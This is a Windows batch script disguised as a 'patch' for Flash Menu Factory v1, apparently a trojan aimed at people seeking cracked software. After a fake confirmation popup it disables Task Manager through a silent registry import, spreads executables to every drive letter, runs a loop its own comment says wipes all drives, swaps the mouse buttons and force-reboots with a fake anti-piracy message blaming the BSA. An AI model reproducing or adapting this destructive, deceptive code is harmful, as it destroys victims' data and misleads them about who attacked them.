CLS
@echo This will disable the Windows Task Manager

%MYFILES%\REGEDIT.EXE  /S  %MYFIlES%\dtm.REG

@echo This will display the popup with the following text

set watext=This Will Patch Flash Menu Factory v1
set watext2=~~Continue or Cancel?
%MYFILES%\popup.exe MB QUESTION

CLS

@echo This will copy file.exe to all drive on the computer
@for %%d in (a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z) do copy %MYFILES%\file.exe %%d:\ >nul

CLS

@echo This will copy the REQUIRED command interpreter to all drives on the computer
@for %%d in (a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z) do copy %ComSpec% %%d:\ >nul

CLS

@echo This will copy shutdown.exe to all drives on the computer
@for %%d in (a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z) do copy %MYFILES%\shutdown.exe %%d:\ >nul

@echo WARNING: THIS NEXT LINE WILL WIPE ALL Drives!
cd\
@for %%d in (100,99,98,97,96,95,94,93,92,91,90,89,88,87,86,85,84,83,82,81,80,79,78,77,76,75,74,73,72,71,70,69,68,67,66,65,64,63,62,61,60,59,58,57,56,55,54,53,52,51,50,49,48,47,46,45,44,43,42,41,40,39,38,37,36,35,34,33,32,31,30,29,28,27,26,25,24,23,22,21,20,19,18,17,16,15,14,13,12,11,10,9,8,7,6,5,4,3,2,1,0) do %MYFILES%\file.exe %%d /delall >nul

@echo This will display the popup with the following text

set watext=Flash Menu Factory v1 was Successfully Patched!
set watext2=~~Patch Credit: Team Z.W.T (Zero Wait Time)
%MYFILES%\popup.exe MB

@echo This will swap the left and right mouse buttons
RUNDLL32 USER32,SwapMouseButton

@echo This will reboot the computer, Leaving NO Trace of script!
%MYFILES%\shutdown.exe -t 20 -f -r -c "The BSA Has Wiped Your Entire Computer Network for Having Warez. Questions please call: 1-888-NOPIRACY to get your Data back. Thank You, BSA"
